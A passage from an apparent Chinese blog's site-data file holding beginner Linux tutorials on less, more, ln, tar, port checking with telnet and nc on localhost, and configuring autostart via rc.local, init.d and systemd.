4.2 基本操作\n\n按键             说明\n/字符串           向下搜索“字符串”的功能\n?字符串           向上搜索“字符串”的功能\nn              重复前一个搜索（与 / 或 ? 有关）\nn              反向重复前一个搜索（与 / 或 ? 有关）\nb              向前翻一页\nd              向后翻半页\nq              退出 less 命令\n空格键            向后翻一页\n向上键            向上翻动一行\n向下键            向下翻动一行\ng              移动到第一行\ng（或者shfit+g）   移动到最后一行\n\n\n# 5. 辅助功能\n\n\n# 5.1 浏览自动关闭\n\n语法             参数   说明\nless -e {文件}   -e   当文件显示结束后，自动离开\n\n\n# 5.2 强制 打开\n\n语法             参数   说明\nless -f {文件}   -f   强迫打开特殊文件，例如外围设备代号、目录和二进制文件\n\n\n# 5.3 忽略大小写\n\n语法             参数   说明\nless -i {文件}   -i   忽略搜索时的大小写\n\n\n# 5.4 百分比显示\n\n语法             参数   说明\nless -m {文件}   -m   显示 当前 内容百分比进度\n\n\n# 5.5 行显示\n\n\n# 5.5.1 显示 行号\n\n语法             参数   说明\nless -n {文件}   -n   显示每行的行号（包括空行）\n\n\n# 5.5.2 连续空行 处理 – 只显示一个空行\n\n语法             参数   说明\nless -s {文件}   -s   多个空行 只显示 一行\n\n\n# 6. less 与 cat 和 more 的区别\n\ncat 命令     显示整个文件的内容     单独使用没有翻页功能 – 可以通过 管道 与 more 组合使用     cat 命令还可以将数个文件合并成一个文件的功能（重定向）\n\nmore 命令功能     让画面在显示满一页时暂停     按键操作 显示画面\n\nless 命令功能     less 命令的用法与 more 命令类似，也可以用来浏览超过一页的文件     less 命令除了可以按空格键向下显示文件外，还可以利用上下键来操作显示",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Linux more命令 查看文件",frontmatter:{title:"Linux more命令 查看文件",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/55902c/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/04.Linux%20more%E5%91%BD%E4%BB%A4%20%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6.html",relativePath:"08.软件使用/05.linux/04.Linux more命令 查看文件.md",key:"v-06ed06f7",path:"/pages/55902c/",headers:[{level:3,title:"语法",slug:"语法",normalizedTitle:"语法",charIndex:135},{level:3,title:"实例",slug:"实例",normalizedTitle:"实例",charIndex:709},{level:3,title:"常用操作命令",slug:"常用操作命令",normalizedTitle:"常用操作命令",charIndex:824}],headersStr:"语法 实例 常用操作命令",content:"Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。\n\n\n# 语法\n\nmore [-dlfpcsu] [-num] [+/pattern] [+linenum] [fileNames..]\n\n参数：\n\n * -num 一次显示的行数\n * -d 提示使用者，在画面下方显示 [Press space to continue, 'q' to quit.] ，如果使用者按错键，则会显示 [Press 'h' for instructions.] 而不是 '哔' 声\n * -l 取消遇见特殊字元 ^L（送纸字元）时会暂停的功能\n * -f 计算行数时，以实际上的行数，而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上）\n * -p 不以卷动的方式显示每一页，而是先清除萤幕后再显示内容\n * -c 跟 -p 相似，不同的是先显示内容再清除其他旧资料\n * -s 当遇到有连续两行以上的空白行，就代换为一行的空白行\n * -u 不显示下引号 （根据环境变数 TERM 指定的 terminal 而有所不同）\n * +/pattern 在每个文档显示前搜寻该字串（pattern），然后从该字串之后开始显示 如在a.log里搜索 hello 则 输入 more +/hello a.log\n * +num 从第 num 行开始显示\n * fileNames 欲显示内容的文档，可为复数个数\n\n\n# 实例\n\n逐页显示 testfile 文档内容，如有连续两行以上空白行则以一行空白行显示。\n\nmore -s testfile\n\n从第 20 行开始显示 testfile 之文档内容。\n\nmore +20 testfile\n\n\n# 常用操作命令\n\n * Enter 向下n行，需要定义。默认为1行\n * Ctrl+F 向下滚动一屏\n * 空格键 向下滚动一屏\n * b 向上滚动一屏幕\n * Ctrl+B 返回上一屏\n * = 输出当前行的行号\n * ：f 输出文件名和当前行的行号\n * V 调用vi编辑器\n * !命令 调用Shell，并执行命令\n * q 退出more",normalizedContent:"linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。\n\n\n# 语法\n\nmore [-dlfpcsu] [-num] [+/pattern] [+linenum] [filenames..]\n\n参数：\n\n * -num 一次显示的行数\n * -d 提示使用者，在画面下方显示 [press space to continue, 'q' to quit.] ，如果使用者按错键，则会显示 [press 'h' for instructions.] 而不是 '哔' 声\n * -l 取消遇见特殊字元 ^l（送纸字元）时会暂停的功能\n * -f 计算行数时，以实际上的行数，而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上）\n * -p 不以卷动的方式显示每一页，而是先清除萤幕后再显示内容\n * -c 跟 -p 相似，不同的是先显示内容再清除其他旧资料\n * -s 当遇到有连续两行以上的空白行，就代换为一行的空白行\n * -u 不显示下引号 （根据环境变数 term 指定的 terminal 而有所不同）\n * +/pattern 在每个文档显示前搜寻该字串（pattern），然后从该字串之后开始显示 如在a.log里搜索 hello 则 输入 more +/hello a.log\n * +num 从第 num 行开始显示\n * filenames 欲显示内容的文档，可为复数个数\n\n\n# 实例\n\n逐页显示 testfile 文档内容，如有连续两行以上空白行则以一行空白行显示。\n\nmore -s testfile\n\n从第 20 行开始显示 testfile 之文档内容。\n\nmore +20 testfile\n\n\n# 常用操作命令\n\n * enter 向下n行，需要定义。默认为1行\n * ctrl+f 向下滚动一屏\n * 空格键 向下滚动一屏\n * b 向上滚动一屏幕\n * ctrl+b 返回上一屏\n * = 输出当前行的行号\n * ：f 输出文件名和当前行的行号\n * v 调用vi编辑器\n * !命令 调用shell，并执行命令\n * q 退出more",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux ln链接命令",frontmatter:{title:"linux ln链接命令",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/24822c/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/05.linux%20ln%E9%93%BE%E6%8E%A5%E5%91%BD%E4%BB%A4.html",relativePath:"08.软件使用/05.linux/05.linux ln链接命令.md",key:"v-3e0ce31f",path:"/pages/24822c/",headers:[{level:2,title:"硬链接：",slug:"硬链接",normalizedTitle:"硬链接：",charIndex:225},{level:2,title:"软链接：",slug:"软链接",normalizedTitle:"软链接：",charIndex:443}],headersStr:"硬链接： 软链接：",content:"ln命令可以生成软链接和硬链接，也可叫做符号链接和实体链接。 有兴趣深入理解的可以查阅相关文档，一般的读者只需记住以下几点即可：\n\n 1. 不管是软链接还是硬链接都不会额外增加磁盘空间(虽然实际情况可能会多占用1个block)\n 2. 软链接会占用1个inode，而硬链接不占用inode(想深究的可以自行查阅，不深究的可以直接略过)\n 3. 硬链接不能跨文件系统，不能链接目录(可以得出软链接是可以的)。\n\n\n# 为了更好理解 举例如下：\n\n\n# 硬链接：\n\n假设在当前目录有文件名为linuxidc.jpg(大小为1M)，现在为它创建硬链接linuxidc-h.jpg，那么当前目录就有了2个文件，这2个文件除了名字不一样其他的一模一样，但是占用的实际磁盘空间还是只有1M，改变任何一个文件的内容另一个文件也会跟着改变； 当你只删除linuxidc.jpg或只删除linuxidc-h.jpg时，文件内容都还在磁盘，只有同时删除了这2个文件时才会真的彻底删除该1M的占用。\n\n\n# 软链接：\n\n假设在当前目录有文件名为linuxidc.jpg(大小为1M)，现在为它创建软链接linuxidc-s.jpg，那么当前目录就有了2个文件，linuxidc-s.jpg是一个全新的文件大小为7bytes(等于linuxidc.jpg名称占用的字节数)，它指向linuxidc.jpg(学过C语言的指针理解起来会很快)； 改变任何一个文件的内容另一个文件也会跟着改变，删除linuxidc-s.jpg不影响linuxidc.jpg，但是删除了linuxidc.jpg那么tmp-s.jpg就会失效因为它找不到它指向的文件了 。\n\n#为/root/linuxidc.jpg生成软链接\nln -s /root/linuxidc.jpg /tmp/linuxidc.jpg\n\n#为/root/dir目录生成软链接\nln -s /root/dir /linuxidc/dir1\n\n#为/root/linuxidc.jpg生成硬链接\nln /root/linuxidc.jpg /tmp/linuxidc.jpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",normalizedContent:"ln命令可以生成软链接和硬链接，也可叫做符号链接和实体链接。 有兴趣深入理解的可以查阅相关文档，一般的读者只需记住以下几点即可：\n\n 1. 不管是软链接还是硬链接都不会额外增加磁盘空间(虽然实际情况可能会多占用1个block)\n 2. 软链接会占用1个inode，而硬链接不占用inode(想深究的可以自行查阅，不深究的可以直接略过)\n 3. 硬链接不能跨文件系统，不能链接目录(可以得出软链接是可以的)。\n\n\n# 为了更好理解 举例如下：\n\n\n# 硬链接：\n\n假设在当前目录有文件名为linuxidc.jpg(大小为1m)，现在为它创建硬链接linuxidc-h.jpg，那么当前目录就有了2个文件，这2个文件除了名字不一样其他的一模一样，但是占用的实际磁盘空间还是只有1m，改变任何一个文件的内容另一个文件也会跟着改变； 当你只删除linuxidc.jpg或只删除linuxidc-h.jpg时，文件内容都还在磁盘，只有同时删除了这2个文件时才会真的彻底删除该1m的占用。\n\n\n# 软链接：\n\n假设在当前目录有文件名为linuxidc.jpg(大小为1m)，现在为它创建软链接linuxidc-s.jpg，那么当前目录就有了2个文件，linuxidc-s.jpg是一个全新的文件大小为7bytes(等于linuxidc.jpg名称占用的字节数)，它指向linuxidc.jpg(学过c语言的指针理解起来会很快)； 改变任何一个文件的内容另一个文件也会跟着改变，删除linuxidc-s.jpg不影响linuxidc.jpg，但是删除了linuxidc.jpg那么tmp-s.jpg就会失效因为它找不到它指向的文件了 。\n\n#为/root/linuxidc.jpg生成软链接\nln -s /root/linuxidc.jpg /tmp/linuxidc.jpg\n\n#为/root/dir目录生成软链接\nln -s /root/dir /linuxidc/dir1\n\n#为/root/linuxidc.jpg生成硬链接\nln /root/linuxidc.jpg /tmp/linuxidc.jpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux su切换到 root 终端没有了颜色，解决办法",frontmatter:{title:"linux su切换到 root 终端没有了颜色，解决办法",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4c35af/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/06.linux%20su%E5%88%87%E6%8D%A2%E5%88%B0%20root%20%E7%BB%88%E7%AB%AF%E6%B2%A1%E6%9C%89%E4%BA%86%E9%A2%9C%E8%89%B2%EF%BC%8C%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html",relativePath:"08.软件使用/05.linux/06.linux su切换到 root 终端没有了颜色，解决办法.md",key:"v-578689e6",path:"/pages/4c35af/",headersStr:null,content:"非 root 用户下命令行是有配色的，如下图所示，主要是前面的用户名显示是有颜色的，这样方便区分命令的输出文本和实际输入的命令（实际输入的命令会在有颜色的用户名后面），也方便找到上一条命令的输出的开始位置。\n\n\n\n但是su到root用户后，用户名显示就没有颜色了，和命令输出同样变为白色，如下图所示。\n\n\n\n颜色配置文件：颜色文件是保存在 ～/.bashrc 下的。 ～/.bashrc 里面的PS变量是只作用在用户自己的终端的，切换到 root 之后就需要给 root 重新设置PS，默认的 /root/.bashrc 为空，或者有些缺失，好奇的话，可以vim看一看。（这里的～符号表示当前用户的家目录，如果在root下，～/.bashrc指的就是root用户的配置文件）\n\n修改方法：把我们需要的PS设置复制到 /root/.bashrc，就可以修改颜色了，输入如下命令：sudo cp ~/.bashrc /root/.bashrc\n\n效果：如下图（root用户下也是和其他用户一样的配色）\n\n",normalizedContent:"非 root 用户下命令行是有配色的，如下图所示，主要是前面的用户名显示是有颜色的，这样方便区分命令的输出文本和实际输入的命令（实际输入的命令会在有颜色的用户名后面），也方便找到上一条命令的输出的开始位置。\n\n\n\n但是su到root用户后，用户名显示就没有颜色了，和命令输出同样变为白色，如下图所示。\n\n\n\n颜色配置文件：颜色文件是保存在 ～/.bashrc 下的。 ～/.bashrc 里面的ps变量是只作用在用户自己的终端的，切换到 root 之后就需要给 root 重新设置ps，默认的 /root/.bashrc 为空，或者有些缺失，好奇的话，可以vim看一看。（这里的～符号表示当前用户的家目录，如果在root下，～/.bashrc指的就是root用户的配置文件）\n\n修改方法：把我们需要的ps设置复制到 /root/.bashrc，就可以修改颜色了，输入如下命令：sudo cp ~/.bashrc /root/.bashrc\n\n效果：如下图（root用户下也是和其他用户一样的配色）\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux查看对方端口是否打开",frontmatter:{title:"linux查看对方端口是否打开",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/4e8039/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/07.linux%E6%9F%A5%E7%9C%8B%E5%AF%B9%E6%96%B9%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E6%89%93%E5%BC%80.html",relativePath:"08.软件使用/05.linux/07.linux查看对方端口是否打开.md",key:"v-64114b98",path:"/pages/4e8039/",headersStr:null,content:"# telnet\n\ntelnet使用的是tcp协议，换句话说telnet只能检测tcp的这个端口打开了没\n\ntelnet 127.0.0.1 80\n\n\n1\n\n\n\n# nc\n\nnc（netcat）也可查看端口是否打开。\n\n查看tcp 端口是否打开\n\nnc  -zv 127.0.0.1 80\n\n\n1\n\n\n查看udp端口是否打开\n\nnc  -zuv127.0.0.1 80\n\n\n1\n\n\n一次查看多个端口信息\n\nnc -vz 127.0.0.1 20-30\n\n\n1\n",normalizedContent:"# telnet\n\ntelnet使用的是tcp协议，换句话说telnet只能检测tcp的这个端口打开了没\n\ntelnet 127.0.0.1 80\n\n\n1\n\n\n\n# nc\n\nnc（netcat）也可查看端口是否打开。\n\n查看tcp 端口是否打开\n\nnc  -zv 127.0.0.1 80\n\n\n1\n\n\n查看udp端口是否打开\n\nnc  -zuv127.0.0.1 80\n\n\n1\n\n\n一次查看多个端口信息\n\nnc -vz 127.0.0.1 20-30\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux解压缩 tar命令_",frontmatter:{title:"linux解压缩 tar命令_",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/0d2e25/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/09.linux%E8%A7%A3%E5%8E%8B%E7%BC%A9%20tar%E5%91%BD%E4%BB%A4_.html",relativePath:"08.软件使用/05.linux/09.linux解压缩 tar命令_.md",key:"v-9dbd6d90",path:"/pages/0d2e25/",headers:[{level:2,title:"压缩文件",slug:"压缩文件",normalizedTitle:"压缩文件",charIndex:14},{level:2,title:"解压文件",slug:"解压文件",normalizedTitle:"解压文件",charIndex:26}],headersStr:"压缩文件 解压文件",content:"# 参数说明\n\n * c ：压缩文件\n\n * x ：解压文件\n\n * v ：显示指令执行过程\n\n * f ：指定文件\n\n * z ：使用gzip来处理 （带上.gz后缀的需要带上这个参数）\n\n\n# 例子\n\n\n# 压缩文件\n\n将当前目录里的 a.txt b.txt 压缩到文件c.tar.gz\n\ntar -czvf c.tar.gz a.txt b.txt\n\n\n1\n\n\n\n# 解压文件\n\n将c.tar.gz解压缩出来\n\ntar -xzvf c.tar.gz\n\n\n1\n",normalizedContent:"# 参数说明\n\n * c ：压缩文件\n\n * x ：解压文件\n\n * v ：显示指令执行过程\n\n * f ：指定文件\n\n * z ：使用gzip来处理 （带上.gz后缀的需要带上这个参数）\n\n\n# 例子\n\n\n# 压缩文件\n\n将当前目录里的 a.txt b.txt 压缩到文件c.tar.gz\n\ntar -czvf c.tar.gz a.txt b.txt\n\n\n1\n\n\n\n# 解压文件\n\n将c.tar.gz解压缩出来\n\ntar -xzvf c.tar.gz\n\n\n1\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"linux开机自启动",frontmatter:{title:"linux开机自启动",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/8a7764/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/11.linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8.html",relativePath:"08.软件使用/05.linux/11.linux开机自启动.md",key:"v-3cd38dec",path:"/pages/8a7764/",headers:[{level:2,title:"linux下添加简单的开机自启动脚本",slug:"linux下添加简单的开机自启动脚本",normalizedTitle:"linux下添加简单的开机自启动脚本",charIndex:2},{level:3,title:"注：博主使用的ubuntu-16.04进行实验，其它版本可能有偏差，但实现原理类似。",slug:"注-博主使用的ubuntu-16-04进行实验-其它版本可能有偏差-但实现原理类似。",normalizedTitle:"注：博主使用的ubuntu-16.04进行实验，其它版本可能有偏差，但实现原理类似。",charIndex:93},{level:2,title:"rc.local",slug:"rc-local",normalizedTitle:"rc.local",charIndex:140},{level:3,title:"在rc.local脚本中添加开机自启动程序",slug:"在rc-local脚本中添加开机自启动程序",normalizedTitle:"在rc.local脚本中添加开机自启动程序",charIndex:153},{level:3,title:"删除",slug:"删除",normalizedTitle:"删除",charIndex:1515},{level:2,title:"将用户脚本添加到/etc/init.d中",slug:"将用户脚本添加到-etc-init-d中",normalizedTitle:"将用户脚本添加到/etc/init.d中",charIndex:1608},{level:3,title:"添加用户进程",slug:"添加用户进程",normalizedTitle:"添加用户进程",charIndex:1633},{level:3,title:"删除用户进程",slug:"删除用户进程",normalizedTitle:"删除用户进程",charIndex:2933},{level:2,title:"systemd的开机自启动",slug:"systemd的开机自启动",normalizedTitle:"systemd的开机自启动",charIndex:3018},{level:2,title:"确定系统是否应用了systemd工具来管理",slug:"确定系统是否应用了systemd工具来管理",normalizedTitle:"确定系统是否应用了systemd工具来管理",charIndex:3236},{level:2,title:"systemctl的使用",slug:"systemctl的使用",normalizedTitle:"systemctl的使用",charIndex:3645},{level:2,title:"设置开机自启动",slug:"设置开机自启动",normalizedTitle:"设置开机自启动",charIndex:77},{level:2,title:"配置文件的简单解析",slug:"配置文件的简单解析",normalizedTitle:"配置文件的简单解析",charIndex:4841}],headersStr:"linux下添加简单的开机自启动脚本 注：博主使用的ubuntu-16.04进行实验，其它版本可能有偏差，但实现原理类似。 rc.local 在rc.local脚本中添加开机自启动程序 删除 将用户脚本添加到/etc/init.d中 添加用户进程 删除用户进程 systemd的开机自启动 确定系统是否应用了systemd工具来管理 systemctl的使用 设置开机自启动 配置文件的简单解析",content:'# linux下添加简单的开机自启动脚本\n\n在linux的使用过程中，我们经常会碰到需要将某个自定义的应用程序设置为开机自启动以节省操作时间，这里提供两个设置开机自启动的方法。\n\n\n# 注：博主使用的ubuntu-16.04进行实验，其它版本可能有偏差，但实现原理类似。\n\n\n# rc.local\n\n\n# 在rc.local脚本中添加开机自启动程序\n\nubuntu在开机过程之后，会执行/etc/rc.local(注意/etc/init.d中也有个rc.local，不要弄混了)文件中的脚本程序，初始情况下，这个文件内容是这样的：\n\ndowney@ubuntu:~$ cat /etc/rc.local\n#!/bin/sh -e\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will "exit 0" on success or any other\n# value on error.\n#\n# In order to enable or disable this script just change the execution\n# bits.\n#\n# By default this script does nothing. \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n并不包含其它内容，用户可以在里面添加需要开机执行的脚本命令，这里以diodon粘贴板工具为例，如果我要开机运行diodon进程，在文本中添加：\n\ndowney@ubuntu:~$ cat /etc/rc.local\n#!/bin/sh -e\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will "exit 0" on success or any other\n# value on error.\n#\n# In order to enable or disable this script just change the execution\n# bits.\n#\n# By default this script does nothing.\n./usr/bin/diodon &\nexit 0 \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n看到这里有些盆友就要问了，为什么要在执行命令后面加&？\n\n在shell执行命令后加&是为了让应用程序在后台运行，rc.local也是一个脚本，主进程在运行这个脚本时必须能够返回，如果在这个脚本里面执行了一些死循环或者其他无法返回的任务，整个系统就很可能卡死在这里，无法启动，所以在这里运行的用户程序必须是能够返回或者本身就使用一些后台运行的进程。\n\n经过上面的添加，在下次重启的时候，使用命令：\n\ndowney@ubuntu:~$ ps -ef |grep "diodon"\ndowney     2097   1880  0 22:53 ?        00:00:04 diodon\ndowney     2937   2842  0 23:27 pts/2    00:00:00 grep --color=auto diodon \n\n\n1\n2\n3\n\n\n就可以看到diodon进程已经在后台运行。\n\n\n# 删除\n\n既然有添加，就必须得有删除，其实以rc.local的删除方式很简单，直接删除rc.local中用户添加的部分即可。\n\n需要提醒的是，在操作系统文件时，做备份是非常必要的\n\n\n# 将用户脚本添加到/etc/init.d中\n\n\n# 添加用户进程\n\n第二种方式就是将自己的用户脚本添加到/etc/init.d并链接到自启动程序当中。\n\n还是以diodon软件来举例，我编辑一个运行diodon的脚本：\n\n#!/bin/bash\n./usr/bin/diodon \n\n\n1\n2\n\n\n将其命名为diodon.sh,并用指令：\n\nchmod +x diodon.sh\nsudo cp diodon.sh /etc/init.d/ \n\n\n1\n2\n\n\n将文件放到/etc/init.d目录中，然后将diodon,sh脚本链接到开机运行序列中：\n\ncd /etc/init.d\nsudo update-rc.d diodon.sh defaults 96\ninsserv: warning: script \'diodon\' missing LSB tags and overrides \n\n\n1\n2\n3\n\n\n这样重新启动时，就可以看到diodon.sh正在运行了。 sudo update-rc.d diodon.sh defaults 96 在这条指令中，update-rc.d是一个系统的链接工具。\n\n而defaults 96则是指定了脚本的开机顺序，数字为0-99，数字越大执行优先级越低，用户添加的程序最好选择低优先级的执行顺序，因为很可能我们的用户程序会依赖一些系统的应用进程，例如如果应用程序要使用到网络部分，就先得让网络后台程序先初始化完毕。\n\n看到这里，细心的朋友已经发现了，在链接脚本时有一个警告：\n\ninsserv: warning: script \'diodon\' missing LSB tags and overrides \n\n\n1\n\n\n作为一个菜鸟而言，是不敢忽视任何警告的，所以只好求助google，解决办法是在自己的脚本中的#!/bin/bash下添加：\n\n### BEGIN INIT INFO\n# Provides:          downey\n# Required-Start:    $local_fs $network\n# Required-Stop:     $local_fs\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: tomcat service\n# Description:       tomcat service daemon\n### END INIT INFO \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n添加这些的目的是告诉系统一些关于这个启动脚本的具体信息,其中比较重要的有这几项：\n\n# Required-Start:   运行这个脚本需要的环境\n# Required-Start:   停止这个脚本需要的环境\n# Default-Start:    提供运行的运行级别\n# Default-Stop:     不运行的运行级别\n# Description:      描述 \n\n\n1\n2\n3\n4\n5\n\n\n关于linux下的运行级别参考:linux运行级别\n\n\n# 删除用户进程\n\n既然有添加就必然有删除，如果需要删除自定义开机运行脚本，输入：\n\nsudo update-rc.d -f diodon remove \n\n\n1\n\n\n\n# systemd的开机自启动\n\n上面提到的两种方式适用于经典的system V控制系统启动和关闭的情况，但是目前(2018年10月)在大多数发行版上都开始使用了systemd的系统软件控制方式，包括Ubuntu16，centos.systemd系统管理着linux下的进程运行，属于应用程序，不属于linux内核的范畴。\n\n在systemd系统上设置开机自启动的方式也是非常简单的(尽管systemd这套软件管理工具并不简单)。\n\n\n# 确定系统是否应用了systemd工具来管理\n\n这里要注意的是，systemd是linux发行版上的预装工具，用来管理系统软件的启动运行和结束，所以通常来说，这套东西是依赖于发行版的，如果系统使用了这一套工具，那么就可以使用它来管理进程，如果不是，即使你安装了它，它也不会被默认配置为系统管理工具。\n\n查看系统是否使用systemd工具我们可以使用如下的指令：\n\nsystemd --version \n\n\n1\n\n\n如果系统返回如下类似的信息，表明该系统是由systemd工具来管理软件：\n\nsystemd 232\n+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN \n\n\n1\n2\n\n\n\n# systemctl的使用\n\n对软件的管理主要是同通过systemd工具中的systemctl命令，相比于之前的system V的控制方式，systemd显得更加简洁明了，对用户更加友好，拿httpd来举例：\n\n开启httpd服务：\nsudo systemctl start httpd\n设置httpd服务自启动：\nsudo systemctl enable httpd \n\n\n1\n2\n3\n4\n\n\n至于关闭和取消自启动，大家心里应该有数了吧。\n\n\n# 设置开机自启动\n\n我们再回到重点，设置开机自启动。\n\n我们要为目标设置一个配置文件，其实这是可以预想到的，linux作为一个复杂的系统，开机自启动涉及到的依赖、运行级别、运行环境等等问题肯定需要用户去指定，在启动的时候系统才知道怎么正确地去运行软件。这个配置文件固定以.service作为后缀，比如我们如果要运行/home/downey目录下的test.sh脚本，我们可以添加一个配置文件***test.service***:\n\n[Unit]\nDescription=\nDocumentation=\nAfter=network.target\nWants=\nRequires=\n\n[Service]\nExecStart=/home/downey/test.sh\nExecStop=\nExecReload=/home/downey/test.sh\nType=simple\n\n[Install]\nWantedBy=multi-user.target \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n将文件放在/usr/lib/systemd/system 或者 /etc/systemd/system目录下，然后可以测试一下：\n\nsudo systemctl start test.service \n\n\n1\n\n\n然后你可以查看你的/home/downey/test.sh脚本是否已经运行，如果已经运行表示配置文件没有问题。然后可以键入：\n\nsudo systemctl enable test.service \n\n\n1\n\n\n设置test脚本开机启动。如果上一步没有出问题，这一步基本上也不会有什么问题，系统会打印出如下信息：\n\nCreated symlink /etc/systemd/system/multi-user.target.wants/test.service → /usr/lib/systemd/system/test.service. \n\n\n1\n\n\n可以看到，这里在/etc/systemd/system/multi-user.target.wants/目录下创建了一个/usr/lib/systemd/system/test.service文件的软链接，到这里设置开机自启动就完成了。\n\n\n# 配置文件的简单解析\n\n在上面的配置文件中，为了演示起见，我将一些本测试脚本不需要但是比较重要的配置项也写了出来，其实如果不需要可以删除，但是[Unit]/[Service]/[Install]这三个标签需要保留。 我们来一个个简单介绍一下配置项：\n\nDescription：运行软件描述\nDocumentation：软件的文档\nAfter：因为软件的启动通常依赖于其他软件，这里是指定在哪个服务被启动之后再启动，设置优先级\nWants：弱依赖于某个服务，目标服务的运行状态可以影响到本软件但不会决定本软件运行状态\nRequires：强依赖某个服务，目标服务的状态可以决定本软件运行。\nExecStart：执行命令\nExecStop：停止执行命令\nExecReload：重启时的命令\nType：软件运行方式，默认为simple\nWantedBy：这里相当于设置软件，选择运行在linux的哪个运行级别，只是在systemd中不在有运行级别概念，但是这里权当这么理解。 \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n如果有多项，用逗号作为分隔。',normalizedContent:'# linux下添加简单的开机自启动脚本\n\n在linux的使用过程中，我们经常会碰到需要将某个自定义的应用程序设置为开机自启动以节省操作时间，这里提供两个设置开机自启动的方法。\n\n\n# 注：博主使用的ubuntu-16.04进行实验，其它版本可能有偏差，但实现原理类似。\n\n\n# rc.local\n\n\n# 在rc.local脚本中添加开机自启动程序\n\nubuntu在开机过程之后，会执行/etc/rc.local(注意/etc/init.d中也有个rc.local，不要弄混了)文件中的脚本程序，初始情况下，这个文件内容是这样的：\n\ndowney@ubuntu:~$ cat /etc/rc.local\n#!/bin/sh -e\n#\n# rc.local\n#\n# this script is executed at the end of each multiuser runlevel.\n# make sure that the script will "exit 0" on success or any other\n# value on error.\n#\n# in order to enable or disable this script just change the execution\n# bits.\n#\n# by default this script does nothing. \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n并不包含其它内容，用户可以在里面添加需要开机执行的脚本命令，这里以diodon粘贴板工具为例，如果我要开机运行diodon进程，在文本中添加：\n\ndowney@ubuntu:~$ cat /etc/rc.local\n#!/bin/sh -e\n#\n# rc.local\n#\n# this script is executed at the end of each multiuser runlevel.\n# make sure that the script will "exit 0" on success or any other\n# value on error.\n#\n# in order to enable or disable this script just change the execution\n# bits.\n#\n# by default this script does nothing.\n./usr/bin/diodon &\nexit 0 \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n看到这里有些盆友就要问了，为什么要在执行命令后面加&？\n\n在shell执行命令后加&是为了让应用程序在后台运行，rc.local也是一个脚本，主进程在运行这个脚本时必须能够返回，如果在这个脚本里面执行了一些死循环或者其他无法返回的任务，整个系统就很可能卡死在这里，无法启动，所以在这里运行的用户程序必须是能够返回或者本身就使用一些后台运行的进程。\n\n经过上面的添加，在下次重启的时候，使用命令：\n\ndowney@ubuntu:~$ ps -ef |grep "diodon"\ndowney     2097   1880  0 22:53 ?        00:00:04 diodon\ndowney     2937   2842  0 23:27 pts/2    